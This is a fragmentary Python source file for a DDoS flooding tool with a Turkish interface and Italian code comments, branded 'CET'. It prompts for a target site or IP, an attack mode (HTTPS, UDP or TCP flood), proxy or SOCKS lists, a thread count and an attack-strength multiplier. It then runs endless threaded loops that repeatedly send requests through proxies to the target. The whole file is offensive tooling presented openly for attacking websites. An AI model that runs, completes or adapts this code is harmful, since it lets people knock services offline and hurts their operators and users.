...
print('''
 ...
 | |____| |____   | |   
  \_____|______|  |_|   
							...
							CET Birliği Tarafından Geliştirilidi!
	''') 
...
def starturl(): 
	...
	url = input("\nCET - SITE LINKI / IPISI: ").strip()

	if url == "":
		print ("CET - LUTFEN IP/URL GIRIN: ")
		starturl()
	...
	try:
		...
		print("CET - Hatali Tekrar Deneyin.")
		starturl()
...
def floodmode(): 
	global choice1
	choice1 = input("CET - HTTPS SALDIRI ICIN '0' UDP SALDIRI ICIN '1' TCP SALDIRI ICIN '2' : ")
	if choice1 == "0":
		proxymode()
	elif choice1 == "1":
		try:
			if os.getuid() != 0: 
				print("CET - BUNUN ICIN ROOT IZNI GEREIYOR.") 
				exit(0) 	
			else: 
				floodport() 
		except:
		...
		try:
			if os.getuid() != 0: 
				print("CET - BUNUN ICIN ROOT IZNI GEREKIYOR.") 
				exit(0) 	
			else: 
				floodport() 
		except:
		...
		print ("CET - HATALI TEKRAR DENE.")
		floodmode()

def floodport():
	global port
	try:
		port = int(input("CET - FLOOD ATMAK ISTEDIGIN PORTU GIR: "))
...
def proxymode():
	global choice2
	choice2 = input("CET - Proxy Veya Soket Modu Aktiflessinmi? evetse 'Y' Hayirsa 'H': ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choiceproxysocks():
	global choice3
	choice3 = input("CET - 0 Proxy Modu / 1 Soket Modu: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
...
def choicedownproxy():
	choice4 = input("CET - Proxy Listesini Guncellemek Istermisin? Evetse 'Y': ")
	if choice4 == "y":
...
def choicedownsocks():
	choice4 = input("CET - Soket Listesini Guncellemek Istermisin? Evetse 'Y': ")
	if choice4 == "y":
...
def proxyget(urlproxy): 
	try:
		...
		out_file.close()
		print ("CET - Proxies downloaded successfully.")
	except: 
		print ("\nERROR!\n")
	proxylist() 
...
def proxylist():
	global proxies
	out_file = str(input("CET - Proxylerin Yerini Yaz Aktif Olani Kullanmak Icin 'ENTER' Bas (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
...
def numthreads():
	global threads
	try:
		threads = int(input("CET - Kac thread Olsun ? Yazmak Istemessen 'ENTER' Bas (800): "))
	except ValueError:
		threads = 800
...
def multiplication():
	global multiple
	try:
		multiple = int(input("CET - Saldiri Gucunu Ayarla [(1-5=normal)(50=Dengeli)(100=Ultra)]: "))
	except ValueError:
		print("HATALI Tekrar Dene.\n")
		multiplication()
	begin()
...
def begin():
	choice6 = input("CET - 'ENTER' A BAS SALDIRI BASLASIN [CET - DDoS] : ")
	if choice6 == "":
		loop()
	elif choice6 == "Enter": 
		loop()
		...
		while True:
			try:
				...
				try:
					...
					s.connect((str(url2),int(port))) # connessione
					s.send(p) # invio
					print ("CET - Proxyler Yönlendiriliyor  " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # req + counter
					try: # invia altre richieste nello stesso thread
						for y in range(multiple): # fattore di moltiplicazione
							s.send(str.encode(p)) # encode in bytes della richiesta HTTP
					except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
					...
					print ("CET - Bu Proxy Kullanilmiyor @", self.counter)
					s.close() # chiude il socket e ricomincia ciclo
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True: # ciclo infinito
			try:
				...
				print ("CET - Proxyler Yönlendiriliyor  " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print delle richieste
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				print ("CET - Proxy Yönlendiriliyor! " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
				...
				try: # il try prova a vedere se l'errore e' causato dalla tipologia di socks errata, infatti prova con SOCKS4
					...
					print ("CET - Proxy Kullanilmiyor. @", self.counter)
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2), int(urlport))) # connessione
				s.send (str.encode(request)) # invio
				print ("CET - Soket Yönlendiriliyor! @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
